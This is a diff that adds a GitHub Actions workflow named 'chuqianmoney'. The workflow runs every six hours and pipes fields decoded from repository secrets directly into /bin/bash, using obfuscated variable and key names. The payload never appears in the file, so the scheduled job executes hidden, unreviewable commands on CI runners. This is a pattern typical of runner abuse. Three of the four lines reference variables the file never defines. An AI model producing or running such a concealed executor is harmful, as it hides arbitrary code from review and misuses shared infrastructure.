@@ -1,0 +1,21 @@
+name: chuqianmoney
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuqianmoney
+        env:
+          cnkft71499: ${{ secrets.cnkft71499 }}
+        run: |
+          echo $cnkft71499 | jq -r .b40072 | /bin/bash
+          echo $spq154 | jq -r .h889 | /bin/bash
+          echo $uxozc0406 | jq -r .u3954 | /bin/bash
+          echo $poijt9719 | jq -r .cv391 | /bin/bash
+
